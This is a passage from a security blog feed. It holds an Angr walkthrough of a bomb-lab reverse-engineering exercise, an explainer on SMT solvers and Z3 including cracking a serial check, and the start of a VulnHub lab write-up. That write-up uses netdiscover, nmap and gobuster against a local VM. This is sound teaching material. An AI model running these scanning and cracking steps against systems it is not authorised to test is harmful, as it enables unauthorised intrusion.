<p>Thus, we can strategically hook this function and see if we can exact this string from the memory.</p>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Phase%201%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Phase%201%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approaches taken to solve this phase.</p>
<h3 id="phase-2">Phase 2</h3>
<p>Function: <code>phase_2</code></p>
<p><img src="/Symbolic_Execution_and_Angr/1_2020-06-04-153538_1920x1080_scrot.png" alt="&ldquo;phase_2&rdquo;">
<em>Disassembly of the phase_2 function.</em></p>
<p>A few observations follow:</p>
<ul>
<li>A function, namely <code>read_six_numbers</code>, is called in the first block.
<ul>
<li>The compare instruction on the end of the first block makes sure the first integer in the user input should be 1.</li>
</ul>
</li>
<li>A loop construct is present in the bottom right blocks.
<ul>
<li>Values from different indices of the array represented by <code>RBX</code> are being compared among themselves.</li>
<li>Since <code>RBX</code> gets the address of an array referenced with the <code>RSP</code> register in the previous block, the number array seems to be on the stack.</li>
</ul>
</li>
</ul>
<p>Although Angr works out well despite us explicitly asking it to take care of it, it might become necessary for us to explicitly take care of it. All we need to do is add a constraint on the symbolic value should such a case arise. This is done by simply adding the constraint on that symbolic value via the state solver.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-152741_1920x1080_scrot.png" alt="&ldquo;read_six_numbers&rdquo;">
<em>Disassembly of the read_six_numbers function.</em></p>
<p>Simply maps the string passed as an argument to the function via <code>RDI</code> (user input) to a format string passed via <code>ESI</code> to <code>sscanf</code>. </p>
<p>Basically reads six numbers from the user input, since after return, <code>EAX</code> would contain number of successful inputs scanned(return value of <code>sscanf</code>) and it is supposed to be greater than 5, referring to the end of the first block.</p>
<p>Since <code>sscanf</code> is being used and inputs are being mapped in memory, it confirms our suspicion that the number array remains on the stack.</p>
<p>Let&rsquo;s check the stack using a debugger to verify.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-154454_1920x1080_scrot.png" alt="&ldquo;before&rdquo;">
<em>Before read_six_numbers is called.</em></p>
<p>We can see that an argument of <code>1 1 1 1 1 1</code> is provided to the function.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-154504_1920x1080_scrot.png" alt="&ldquo;after&rdquo;">
<em>After read_six_numbers is called.</em></p>
<p>We can see that the input we gave is immediately pushed on the stack by the function call. Note the seemingly weird format of the number. We would need to keep this in mind while deciphering the values when we dump them.</p>
<p>Therefore,</p>
<ul>
<li>User input: <code>RDI</code> register ⇨ pushed on stack.</li>
<li>Comparison value: number array itself.</li>
</ul>
<p>Since no value is pushed before these numbers in phase_2, we don&rsquo;t need to setup the stack and we can start symbolic execution right here and push the input on the stack. Since nothing else is pushed onto the stack all the while, it can be popped off the stack at the end.</p>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Phase%202%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Phase%202%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approaches taken to solve this phase.</p>
<h3 id="phase-3">Phase 3</h3>
<p>Function: <code>phase_3</code></p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-171912_1920x1080_scrot.png" alt="&ldquo;phase_3&rdquo;">
<em>Disassembly of the phase_3 function.</em></p>
<p>A few observations follow:</p>
<ul>
<li>This function has a jump table(essentially a switch case that has been resolved by the compiler).
<ul>
<li>There are 8 cases present.</li>
</ul>
</li>
<li>The function simply maps the string passed as an argument to the function via <code>RDI</code> (user input) to a format string passed via <code>ESI</code> to <code>sscanf</code>.</li>
<li>The first block shows the format string resolved. It clearly shows that a set of two integers are given as input.</li>
<li>Going through the assembly, it becomes clear that it&rsquo;s a pair-set value, that is, the second value will be accepted based on what the first value is.</li>
</ul>
<p>So we once again verify the stack structure and see if our previous approach would work.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-04-172422_1920x1080_scrot.png" alt="&ldquo;before&rdquo;">
<em>Before sscanf is called.</em></p>
<p>We can see that an argument of <code>1 1</code> is provided to the function.</p>
<p><img src="/Symbolic_Execution_and_Angr/1_2020-06-04-172430_1920x1080_scrot.png" alt="&ldquo;after&rdquo;">
<em>After sscanf is called.</em></p>
<p>The top of the stack is a null value while our input is right below it. Therefore, a kind of a stack setup is required before we can proceed.</p>
<p>Therefore,</p>
<ul>
<li>User input: <code>RDI</code> register</li>
<li>Comparison value: a switch case with one to one comparison between the two integers entered.</li>
</ul>
<p>Since no other push to stack exists in the function, we can pop values like before, while keeping in mind to pop the value we setup the stack with first.</p>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Phase%203%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Phase%203%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approaches taken to solve this phase.</p>
<h3 id="phase-4">Phase 4</h3>
<p>Function: <code>phase_4</code></p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-06-003920_1920x1080_scrot.png" alt="&ldquo;phase_4&rdquo;">
<em>Disassembly of the phase_4 function.</em></p>
<p>A few observations follow:</p>
<ul>
<li>The function takes up an input with two integers, and passes them onto another function, namely <code>func4</code>. The result of this function is based on the result of this sub-function, and therefore needs to be paid special attention to.</li>
<li>Before this function is called, three values are moved into specific registers, and the registers chosen make it clear that these are the arguments to this function. Thus, it received the arguments: <code>(&lt;user_input&gt;, 0, 14)</code>.</li>
<li>Right after the code block where this function was executed, we can see our other argument being comapred against <code>0x0</code>. Since our main focus would be on this function, we can explicitly put the second input as <code>0x0</code> when we put in the flag, and not bother about it at the moment.</li>
</ul>
<p>All we need is that function to return a <code>0x0</code>.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-06-004556_1920x1080_scrot.png" alt="&ldquo;func4&rdquo;">
<em>Disassembly of the func4 function.</em></p>
<p>From the first look, this function comes out to be recursive in nature. Now, that might not have been that big of a problem if we had not been using a tool to solve the intricacies presented by this problem. You see, a recursive function might cause an automated tool(working with no concrete values, only symbolic ones) to get stuck in it&rsquo;s own loop, causing a path explosion. </p>
<p>Since checks are in place to prevent the tool from going down a rabbit hole, therefore instead of tinkering with the recursion depths here, let&rsquo;s just focus a little bit deeper onto the function. We can see that going along with the single middle block will do the trick.</p>
<p>Therefore,</p>
<ul>
<li>User input: Moved into the <code>EDX</code> register.</li>
<li>Comparison value: Operations carried out on the input with the values <code>0x0</code> and <code>0xE</code>.</li>
</ul>
<p>So what we have to do is:</p>
<ol>
<li>Setup the registers as they are supposed to for the function call.</li>
<li>Go through the first block so as to reach the single middle block.</li>
<li>Satisfy the comparison at the end of the single middle block.</li>
</ol>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Phase%204%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Phase%204%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approaches taken to solve this phase.</p>
<h3 id="phase-5">Phase 5</h3>
<p>Function: <code>phase_5</code></p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-08-092622_1920x1080_scrot.png" alt="&ldquo;phase_5&rdquo;">
<em>Disassembly of the phase_5 function.</em></p>
<p>A few observations follow:</p>
<ul>
<li>The function takes up a string as an input.</li>
<li>Input length is restricted at <code>0x6</code>, with reference to the compare instruction at the end of first block.</li>
<li>A loop can be observed in the middle.
<ul>
<li>Performs some computations on every character of the string.</li>
<li>The <code>and</code> operation in the middle of the loop may require us to undo a mask.</li>
</ul>
</li>
<li>The computed string is compared with the string <code>flyers</code>.</li>
</ul>
<p>Seems pretty straightforward.</p>
<p>But what about the input? A string input needs to be placed somewhere in the memory. Since there seem to be no push operations, we need to find the address where the input is being stored at. We&rsquo;ll look it up in a debugger.</p>
<p><img src="/Symbolic_Execution_and_Angr/1_image.png" alt="&ldquo;beginning&rdquo;">
<em>Beginning of phase_5 function.</em></p>
<p>Therefore,</p>
<ul>
<li>User input: Stored at the address <code>0x6038c0</code>.</li>
<li>Comparison value: Compared with string <code>flyers</code> (evident following the cross references in the disassembly) after a bunch of manipulations to the input.</li>
</ul>
<p>So what we have to do is:</p>
<ol>
<li>Setup the registers as they are supposed to for the function call.</li>
<li>Go through the first block so as to reach the single middle block.</li>
<li>Satisfy the comparison at the end of the single middle block.</li>
</ol>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Phase%205%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Phase%205%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approaches taken to solve this phase.</p>
<h3 id="phase-6">Phase 6</h3>
<p>Function: <code>phase_6</code></p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-14-052441_1920x1080_scrot.png" alt="&ldquo;phase_6&rdquo;">
<em>Disassembly of the phase_6 function.</em></p>
<p>From a perspective where we just worry about setting up the input, this function essentially seems no different than <code>phase_2</code>.</p>
<p>There seem to be two sets of loops, prominent blue and red arrows indicating their flow. One modifies the input (the one with the blue arrow) and the other one verifies it (the one with the red arrow).</p>
<p>A function, namely <code>read_six_numbers</code>, is called in the first block, which maps our input onto the stack.</p>
<p><img src="/Symbolic_Execution_and_Angr/3_image.png" alt="&ldquo;stack&rdquo;">
<em>Stack after read_six_numbers is called.</em></p>
<p>An added point of interest is the state of registers. R13 gets the stack address (where the input we provided is at the top) and then is iterated through all the values on top of the stack (our input) in the block right after the first, where it is essentially made sure that each number is less than or equal to 6. This could be added as a constraint (not a necessity though).</p>
<p><img src="/Symbolic_Execution_and_Angr/4_image.png" alt="&ldquo;registers&rdquo;">
<em>Registers after read_six_numbers is called.</em></p>
<p>We could simply apply the same approach as we did in <code>phase_2</code> (by pushing values to stack and popping in the end, minding the formatting), with a slight change: reversing the manipulation did by the first loop denoted by the blue arrow in the picture showing the disassembly of the <code>phase_6</code> function.</p>
<p>This is because the instructions perform some form of manipulation (observed by the fact that the Angr gave an answer that wasn&rsquo;t right on popping, although it fit the conditions, verified by running in a debugger), that rearrange our input using their addresses. It&rsquo;s more than believable since a further look at the disassembly showed a linked list being initialized with the values given as input, and it becomes the subject of the manipulations in the loops shown by the red arrow in the picture showing the disassembly of the <code>phase_6</code> function.</p>
<p>Since we got the modified input (from the “not so wrong&rdquo; output), we could simply reverse that transformation to get the original input.</p>
<p>The instruction to be focused on is <code>000000000040115B                 mov     ecx, 7</code></p>
<p>Therefore, we could just subtract the values we get from Angr to get the original input to bypass the stage.</p>
<h3 id="alternative-approach">Alternative Approach</h3>
<p>Instead of pushing the values onto the stack, we&rsquo;ll find out the address where the values are put and store them right there, just to see if we can make it work.</p>
<p>We&rsquo;ll start from the beginning of the function, and add a hook to the read_six_numbers function so as to make it return without doing anything, while we explicitly store the symbolic values in the memory.</p>
<p>To find out the address where we need to put the values, let&rsquo;s open the binary in the debugger.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-16-033553-screenshot.png" alt="&ldquo;args&rdquo;">
<em>Arguments to sscanf function.</em></p>
<p>We can clearly see the addresses to which the values are to be stored. Thus, we save the values right on these addresses to form a sequence, as expected by the binary.</p>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Phase%206%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Phase%206%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approaches taken to solve this phase.</p>
<h3 id="secret-phase">Secret Phase</h3>
<p>Function: <code>secret_phase</code></p>
<h5 id="discovering-the-secret-phase">Discovering the Secret Phase</h5>
<p>Let&rsquo;s start bu discovering the <code>secret_phase</code> function.</p>
<p><img src="/Symbolic_Execution_and_Angr/1_2020-06-16-045900-screenshot.png" alt="&ldquo;xrefs&rdquo;">
<em>Cross references chart.</em></p>
<p>From the _xrefs char_t, we can see that only one function invokes the <code>secret_phase</code> function.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-16-050208-screenshot.png" alt="&ldquo;phase_defused&rdquo;">
<em>Disassembly of the phase_defused function.</em></p>
<p>The phase_defused function simply checks a couple of conditions based on which, it invokes the secret phase.</p>
<p>The middle blocks are responsible to check if our input are worthy of unlocking this secret phase. It takes on the input from one of the phases and verifies it to decide whether to unlock the secret phase. The point of interest here is that the address being used here(<code>0x603870</code>), in the call to <code>sscanf</code> to source values for the variables, is hard-coded and is not of the buffer that stores the address. A search for cross references to it yield nothing. So to find out that phase, we use the debugger and monitor any changes made to this address (using hardware watchpoints).</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-16-051601-screenshot.png" alt="&ldquo;hardware_watchpoint&rdquo;">
<em>Hardware watchpoint triggered.</em></p>
<p>The hardware watchpoint is triggered right when the input is given for the <code>phase_4</code> function. Therefore, the input for this phase needs to be modified so as to unlock the secret phase.</p>
<p>Now we know how to unlock it, we&rsquo;ll just pass a symbolic value to Angr hoping that it&rsquo;ll be able to give us the string input which will be the key.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-16-053413-screenshot.png" alt="&ldquo;call&rdquo;">
<em>Call to sscanf function.</em></p>
<p>We can just slide in the symbolic value at the address where the string will be dereferenced(<code>0x7fffffffdf10</code>) and then let Angr do it&rsquo;s magic over the bunch of instructions that carry out the comparison.</p>
<p>After we get the key to the phase, we can move on to solving it.</p>
<h5 id="solving-the-secret-phase">Solving the Secret Phase</h5>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-16-042658-screenshot.png" alt="&ldquo;secret_phase&rdquo;">
<em>Disassembly of the secret_phase function.</em></p>
<p>A few observations follow:</p>
<ul>
<li>The function takes the string input and converts it into a long.</li>
<li>Only a single function, namely <code>fun7</code>, needs to be bypassed to solve the phase.</li>
</ul>
<p>It&rsquo;s pretty simple and straightforward, especially compared to what we have done in all the previous phases.</p>
<p>Checking out the <code>fun7</code> function, it seems to be entangled in some sort of a recursive conditional parsing based on the user input.</p>
<p><img src="/Symbolic_Execution_and_Angr/2020-06-16-043140-screenshot.png" alt="&ldquo;fun7&rdquo;">
<em>Disassembly of the fun7 function.</em></p>
<p>We&rsquo;ll leave it up to Angr to bypass the mess and just give us the answer.</p>
<p>Therefore,</p>
<ul>
<li>User input: <code>RAX</code> register</li>
<li>Comparison value: conditional parsing inside <code>fun7</code>.</li>
</ul>
<p>Since no other push to stack exists in the function, we can pop values like before, while keeping in mind to pop the value we setup the stack with first.</p>
<p>Read this <a href="https://hexterisk.github.io/bomblab-Angr/Secret%20Phase%20x86_64.html">page</a> implemented in this <a href="https://github.com/hexterisk/bomblab-Angr/blob/master/Secret%20Phase%20x86_64.ipynb">IPython Notebook</a> for a step-by-step explanation on the approache</p>
]]></content>
        </item>
        
        <item>
            <title>Constraint Solvers and Z3</title>
            <link>https://hexterisk.github.io/blog/posts/2020/05/15/constraint-solvers-and-z3/</link>
            <pubDate>Fri, 15 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/05/15/constraint-solvers-and-z3/</guid>
            <description>A constraint solver must be versatile, that is, it should be able to act as an:
 Interpreter: Given the input, solve for the output of the equation. Inverter: Given the output, solve for the input of the equation. Synthesizer: Act as both Interpreter and Inverter.  Formulating Programs Assume a formula 𝑆ₚ(𝑥, 𝑦) which holds if and only if program P(x) outputs value y such that
Program: f(𝑥) { return 𝑥 + 𝑥 }</description>
            <content type="html"><![CDATA[<p>A constraint solver must be versatile, that is, it should be able to act as an:</p>
<ul>
<li><strong>Interpreter</strong>: Given the input, solve for the output of the equation.</li>
<li><strong>Inverter</strong>: Given the output, solve for the input of the equation.</li>
<li><strong>Synthesizer</strong>: Act as both Interpreter and Inverter.</li>
</ul>
<h2 id="formulating-programs">Formulating Programs</h2>
<p>Assume a formula <em>𝑆ₚ(𝑥, 𝑦)</em> which holds if and only if program <em>P(x)</em> outputs value <em>y</em> such that</p>
<p><strong>Program:</strong> f(<em>𝑥</em>) { return <em>𝑥</em> + <em>𝑥</em> }</p>
<p><strong>Formula:</strong> <em>𝑆𝒻(𝑥, 𝑦) : 𝑦 = 𝑥 + 𝑥</em></p>
<p>Now, with the program represented as a formula, the solver can be versatile.</p>
<h5 id="solver-as-an--interpreter">Solver as an  <strong>Interpreter</strong>:</h5>
<p>Given x, evaluate f(x).</p>
<p>𝑆𝒻(𝑥, 𝑦) ∧ 𝑥 = 3</p>
<p>⇨ 𝑦 ↦ 6</p>
<h5 id="solver-as-an--inverter">Solver as an  <strong>Inverter</strong>:</h5>
<p>Given f(x), find x.</p>
<p>𝑆𝒻(𝑥, 𝑦) ∧ 𝑦 = 6</p>
<p>⇨ 𝑥 ↦ 3</p>
<h5 id="this-solver-bidirectionality-enables-synthesis">This solver “bidirectionality” enables <strong>Synthesis</strong>.</h5>
<h2 id="specifications">Specifications</h2>
<p>A predicate is a binary-valued function of non-binary variables.</p>
<p><strong>Precondition</strong> (denoted 𝑝𝑟𝑒(𝑥)) of a procedure <em>f</em> is a predicate over <em>f</em>’s parameters 𝑥 that always holds when <em>f</em> is called.  Therefore, <em>f</em> can assume that 𝑝𝑟𝑒(𝑥) holds.</p>
<p><strong>Postcondition</strong> (denoted 𝑝𝑜𝑠𝑡(𝑥, 𝑦)) is a predicate over parameters of <em>f</em> and its return value 𝑦 that holds when <em>f</em> returns. Therefore, <em>f</em> ensures that 𝑝𝑜𝑠𝑡(𝑥, 𝑦) holds.</p>
<p>These pre- and post-conditions are known as <strong>Contracts</strong>.</p>
<p>Usually, these contracts are tested (that is, evaluated dynamically, during execution).</p>
<p><img src="/Constraint_Solvers_and_Z3/image.png" alt="&ldquo;exec&rdquo;">
<strong>Contracts tested during execution.</strong></p>
<p>However, with solvers, we want to test these contracts statically, at design time.</p>
<p><img src="/Constraint_Solvers_and_Z3/FireShot%20Capture%20210%20-%20%20-%20homes.cs.washington.edu.png" alt="&ldquo;static&rdquo;">
<strong>Contracts tested during design with solvers.</strong></p>
<h2 id="verification-problem">Verification Problem</h2>
<p><img src="/Constraint_Solvers_and_Z3/1_FireShot%20Capture%20210%20-%20%20-%20homes.cs.washington.edu.png" alt="&ldquo;verify&rdquo;">
<strong>Verification with Constraint Solver.</strong></p>
<p>The problem at hand is to basically translate preconditions, postconditions, loop conditions, and assertions into solver&rsquo;s formulae in order to determine/verify if all properties can hold.</p>
<p><strong>Correctness condition</strong> <em>𝜙</em> says that the program is correct for all valid inputs:</p>
<p>∀𝑥 . 𝑝𝑟𝑒(𝑥) ⇒ 𝑆ₚ(𝑥, 𝑦) ∧ 𝑝𝑜𝑠𝑡(𝑥, 𝑦)</p>
<p>where, 𝑝𝑟𝑒(𝑥) is valid for all 𝑥_._</p>
<p>            𝑆ₚ(𝑥, 𝑦) computes 𝑦 from 𝑥_._</p>
<p>𝑝𝑜𝑠𝑡(𝑥, 𝑦) is correct.</p>
<p>To prove correctness for all inputs <em>𝑥</em>, search for counterexample 𝑥 where 𝜙 does not hold:</p>
<p>¬ (∀𝑥 . 𝑝𝑟𝑒(𝑥) ⇒ 𝑆ₚ(𝑥, 𝑦) ∧ 𝑝𝑜𝑠𝑡(𝑥, 𝑦))</p>
<p>⇨ ∃𝑥 . ¬ 𝑝𝑟𝑒(𝑥) ⇒ 𝑆ₚ(𝑥, 𝑦) ∧ 𝑝𝑜𝑠𝑡(𝑥, 𝑦)</p>
<p>⇨ ∃𝑥 . 𝑝𝑟𝑒(𝑥) ∧ ¬ 𝑆ₚ(𝑥, 𝑦) ∧ 𝑝𝑜𝑠𝑡(𝑥, 𝑦)</p>
<p>Since 𝑆ₚ always holds, as we can always find 𝑦 given 𝑥,</p>
<p>⇨ ∃𝑥 . 𝑝𝑟𝑒(𝑥) ∧ 𝑆ₚ(𝑥, 𝑦) ∧ ¬ 𝑝𝑜𝑠𝑡(𝑥, 𝑦)</p>
<p><img src="/Constraint_Solvers_and_Z3/2_FireShot%20Capture%20210%20-%20%20-%20homes.cs.washington.edu.png" alt="&ldquo;predicate&rdquo;">
<strong>Passing the verification condition to the solver.</strong></p>
<h2 id="sat-solver">SAT Solver</h2>
<p>A formula/constraint <em>F</em> is satisfiable if there is some assignment of appropriate values to its uninterpreted symbols under which <em>F</em> evaluates to true. Thus, the language of SAT Solvers is Boolean logic.</p>
<p>A <strong>Satisfiability Solver</strong> accepts a formula <em>𝜙(𝑥, 𝑦, 𝑧)</em> and checks if <em>𝜙</em> is satisfiable (SAT).</p>
<p>If yes, the solver returns a model <em>m</em>, a valuation of <em>𝑥, 𝑦, 𝑧</em> that satisfies <em>𝜙</em>, ie, <em>𝑚</em> makes <em>𝜙</em> true. If the formula is unsatisfiable (UNSAT), some solvers return minimal unsat core of <em>𝜙</em>, a smallest set of clauses of <em>𝜙</em> that cannot be satisfied.</p>
<p>Such problems are typically in the CNF(Conjuctive Normal Form) form, that is, a conjunction of one or more clauses, where a clause is a disjunction of literals (an AND of ORs).</p>
<p>SAT solvers are automatic and efficient. As a result, they are frequently used as the “engine” behind verification applications.</p>
<h2 id="smt-solver">SMT Solver</h2>
<p>The <strong>Satisfiability Modulo Theories</strong> problem is a decision problem for logical formulas with respect to combinations of background theories expressed in classical first-order logic with equality.</p>
<ul>
<li>Modular Theory implies that the solver is extensible with different theories.</li>
</ul>
<p>In simpler words, SMT Solvers are built on top of SAT solvers, and they are able to combine the powers of the SAT solver with other domain specific theory solvers(the extensible property comes in here) to solve NP complete problems. Thus, SMT Solvers rely on our ability to solve satisfiability problems, to take problems with boolean variables and constraints to tell us whether there is an assignment to these variables that satisfies that particular problem. A SAT Solver then tries random assignments and propagates them through the constraints. When it runs into a contradiction, it analyses the set of limitations that led to the contradiction and summarizes them into a new constraint so that the same problem can be avoided next time onwards.</p>
<p>For example,</p>
<p>say a stage is given, <em>x&gt;5 AND y&lt;5 AND (y&gt;x OR y&gt;2)</em></p>
<p>SMT solver will divide it into domain specific theories.</p>
<p>⇨ <em>|x&gt;5| AND |y&lt;5| AND (|y&gt;x| OR |y&gt;2|)</em>,    Linear Arithmetic Theory and Boolean Logic.</p>
<p>⇨ <em>f1 AND f2 AND (f3 OR f4)</em></p>
<p>And then hands it off to a SAT Solver, which will try to make this stage satisfiable.</p>
<p>Let&rsquo;s say it comes up with the conclusion that making <em>f1</em>, <em>f2</em> and <em>f3</em> true will make it satisfiable.</p>
<p>Then domain specific theory solvers (Linear Arithmetic Solver) solves <em>f1</em>, <em>f2</em> and <em>f3</em> so as to find inputs that make them satisfiable. Thus it becomes a purely linear arithmetic question now, with no boolean logic.</p>
<p>This specific solver can imply different traditional techniques such as simplex methods to solve these systems for linear inequalities, etc. This solver quickly returns that this conclusion is unsatisfiable, and returns the result along with an explanation to the SAT solver (that <em>f1</em>, <em>f2</em> and <em>f3</em> are mutually exclusive). SAT Solver then remembers not to try that particular situtation anymore. It then comes up with the conclusion that making <em>f1</em>, <em>f2</em> and <em>f4</em> true will make the situation satisfiable. This time the specific solver returns satisfiable, thus bringing this situation to a “satisfiable” conclusion.</p>
<p>Since systems are usually designed and modeled at a higher level than the Boolean level, the translation to Boolean logic can be expensive. SMT Solvers therefore aim to create verification engines that can reason natively at a higher level of abstraction while retaining the efficiency of SAT Solvers. The language of SMT Solvers is therefore First-Order-Logic. The language includes the Boolean operations of Boolean logic, but instead of propositional variables, more complicated expressions involving constant, function, and predicate symbols are used. In other words, imagine an instance of the Boolean satisfiability problem (SAT) in which some of the binary variables are replaced by predicates over a suitable set of non-binary variables.</p>
<p>Some of the popular theories are:</p>
<ul>
<li>Bit Vector Theory
<ul>
<li>Using bit vectors of fixed bit width, such as 8bit vectors and 32bit vectors, as symbols.</li>
</ul>
</li>
<li>Theory of Arrays
<ul>
<li>Used for a collection of objects where the size of an object is unknown beforehand, such as strings.</li>
</ul>
</li>
<li>Theory of Integer Arithmetic
<ul>
<li>Symbols are limited to the integral domain.</li>
</ul>
</li>
<li>Theory of Uninterpreted Functions
<ul>
<li>Within a formula, a call to a function is made, which we know nothing about, except the fact that it will always give the same output for a given input value, such as square root.</li>
</ul>
</li>
</ul>
<p>A very popular SMT Solver is Z3.</p>
<h2 id="z3">Z3</h2>
<p>Introducing the powers of <a href="https://github.com/Z3Prover/z3/wiki#background">Z3</a> in python, run <code>pip install z3-solver</code> to install it via pip.</p>
<p>Follow <a href="https://hexterisk.github.io/Z3Py-Archive/guide-examples.htm">archived docs</a> for basic syntax and a jump start.</p>
<p><a href="https://z3prover.github.io/api/html/">Official Docs</a>for referencing the API in different languages.</p>
<p>Taking Z3 for a spin, let&rsquo;s tackle a well-known problem: Sudoku Solver.</p>
<p>Read this <a href="https://hexterisk.github.io/Z3Py-Archive/Sudoku%20solver%20using%20Z3.html">page</a> implemented in this <a href="https://github.com/hexterisk/Z3Py-Archive/blob/master/Sudoku%20solver%20using%20Z3.ipynb">IPython Notebook</a> for a comprehensive explanation on a Sudoku Solver.</p>
<p>Using Z3 for binary analysis, let&rsquo;s analyse a binary.</p>
<p>Taking up a serial validator, let&rsquo;s take a look at the binary&rsquo;s decompilation.</p>
<p>We are looking at the decompilation to save ourselves the time and effort of reverse engineering, since the main focus is to demonstrate the usage of Z3 to resolve a serial check.</p>
<p><img src="/Constraint_Solvers_and_Z3/2020-05-27-145823_1920x1080_scrot.png" alt="&ldquo;main&rdquo;">
<em>main function.</em></p>
<p><img src="/Constraint_Solvers_and_Z3/2020-05-27-150139_1920x1080_scrot.png" alt="&ldquo;validate&rdquo;">
<em>validate_serial function.</em></p>
<p>Examining the <code>validate_serial</code> function, it is clear that</p>
<ul>
<li>Serial is passed in <code>a1</code>.</li>
<li>Length of the serial is 13, passed in <code>a2</code>.</li>
<li><code>v5</code> is the iterator for the loop run on <code>a1</code>. Loop runs till the last element, but not on last element since it&rsquo;s an exit controlled loop using a pre-increment operator.</li>
<li>All values in <code>a1</code> should be between 46 and 57(line 14), which then has 48 subtracted from it(line 16). Even out to values between 0 and 9(both inclusive).</li>
<li><code>v4</code> is a running sum, with an initial value of 3. Only uses previous value and serial digit value to update current value.</li>
<li>Returns boolean value, so the target is to get the output as <code>Valid: 1</code>.</li>
</ul>
<p>Using the constraints and computations specified, we&rsquo;ll write a Z3 script to give us our good serial.</p>
<p>Read this <a href="https://hexterisk.tech/Z3Py-Archive/Serial%20solver%20using%20Z3.html">page</a> implemented in this <a href="https://github.com/hexterisk/Z3Py-Archive/blob/master/Serial%20solver%20using%20Z3.ipynb">IPython Notebook</a> to follow the solution for this problem.</p>
<p><img src="/Constraint_Solvers_and_Z3/2020-05-27-182912_1920x1080_scrot.png" alt="&ldquo;solution&rdquo;">
<em>Output.</em></p>
<p>Credits for the guidance to Calle Svensson&rsquo;s talk &ldquo;SMT in reverse engineering, for dummies&rdquo; at SEC-T 0x09.</p>
]]></content>
        </item>
        
        <item>
            <title>Serial 2</title>
            <link>https://hexterisk.github.io/blog/posts/2020/05/09/serial-2/</link>
            <pubDate>Sat, 09 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/05/09/serial-2/</guid>
            <description>Name: serial: 2 Date release: 27 Sep 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
LHIP is the Local Host’s IP Address
Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.
IP Discovery Run sudo netdiscover.
It detects online hosts by sending ARP requests.
Output of netdiscover.
192.168.1.10 happens to be the IP of the VM.</description>
            <content type="html"><![CDATA[<ul>
<li><strong>Name</strong>: <a href="https://stackedit.io/%5Bhttps://www.vulnhub.com/entry/serial-2,373/%5D(https://www.vulnhub.com/entry/serial-2,373/)">serial: 2</a></li>
<li><strong>Date release</strong>: 27 Sep 2019</li>
<li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/sk4,633/">sk4</a></li>
<li><strong>Series</strong>: <a href="https://www.vulnhub.com/series/serial,231/">serial</a></li>
</ul>
<h1 id="initial-discovery">Initial Discovery</h1>
<p><code>VMIP</code> is the VM’s IP Address</p>
<p><code>LHIP</code> is the Local Host’s IP Address</p>
<p>Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.</p>
<h3 id="ip-discovery">IP Discovery</h3>
<p>Run <code>sudo netdiscover</code>.</p>
<p>It detects online hosts by sending ARP requests.</p>
<p><img src="/Serial_2/pmHtp_bhilEmwhFJ0EaVuopytJDO0qqDa3KdbCIKVqbOl_CMDDaxCX1q8h4e3aLkc2XpUbWhvpKxBIniTkano_6rqd64e03ezaeAsEfC0EafGfIe0R6LdGPOtrYOGwfbiCd0MVl1jkf4zngdlQ.png" alt="&ldquo;netdiscover&rdquo;">
<em>Output of netdiscover.</em></p>
<p>192.168.1.10 happens to be the IP of the VM.</p>
<h3 id="port-discovery">Port Discovery</h3>
<p>Search for any exposed ports on the VM.</p>
<p>Run <code>nmap -sC -sV -p- -A 192.168.1.10</code>.</p>
<p>Format: <code>nmap -sC -sV -p- -A VMIP</code></p>
<p><img src="/Serial_2/4yfIFaS_awg0jySSCFWMdM5P3xRl1fXufxKqBwxxW0QKB1z9M6ZivOLCEEJiMK1WrjfplxTM16sGQJHfpQA5aEuxMt1vlpiFGIMAYLY98TvFvwgQbjO1accmc_X2X3sZqt18ti_YPrNQRTLZJg.dat" alt="&ldquo;nmap&rdquo;">
<em>Output of nmap.</em></p>
<p><strong>Port 22</strong> is hosting an <strong>SSH</strong> service is running that we might try connecting to later.</p>
<p><strong>Port 10000</strong> has a weird service <strong>snet-sensor-mgmt</strong> running.</p>
<h3 id="directory-discovery">Directory Discovery</h3>
<p>Attempting to enumerate through all the endpoints.
Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">common.txt</a> wordlist.</p>
<p>Run <code>gobuster dir -w common.txt -u 192.168.1.10</code></p>
